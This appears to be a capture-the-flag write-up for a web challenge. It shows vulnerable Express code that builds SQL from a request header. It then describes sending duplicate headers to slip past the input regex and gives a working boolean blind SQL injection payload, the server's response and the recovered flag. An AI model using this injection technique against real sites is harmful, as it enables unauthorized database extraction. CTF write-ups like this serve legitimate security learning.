# Solution

We can query for flag using `x-steve-supposition` header but only allows alphabets, numbers plus curly brackets. 

```
const rows = await db.all(`SELECT * FROM flag WHERE value = '${req.get("x-steve-supposition")}'`);

  // 🧪 Validation de la structure de la supposition : uniquement des caractères honorables
    if (!/^[a-zA-Z0-9{}]+$/.test(steveHeaderValue)) {
        return res.status(403)
```

Website regex only check the latest `x-steve-supposition` header, so we can have two same headers, one for the blind sql, another one that can satisfy the regex.

Can use Burp or Python script to automate. Search for response 200.

```
X-Steve-Supposition: ' OR SUBSTR((SELECT * FROM flag LIMIT 1), 1, 7) = 'UMDCTF{' -- 
X-Steve-Supposition: l

HTTP/2 200 OK
Access-Control-Allow-Origin: *
Content-Type: text/html; charset=utf-8
Date: Sun, 27 Apr 2025 04:24:45 GMT
Etag: W/"d-DPtoqvEp5otIj4FHsGx6Sh2Z5RM"
X-Powered-By: Express
Content-Length: 13

Tu as raison!
```

Flag: `UMDCTF{ile5TVR4IM3NtTresbEAu}`


Solved by: arifpeycal
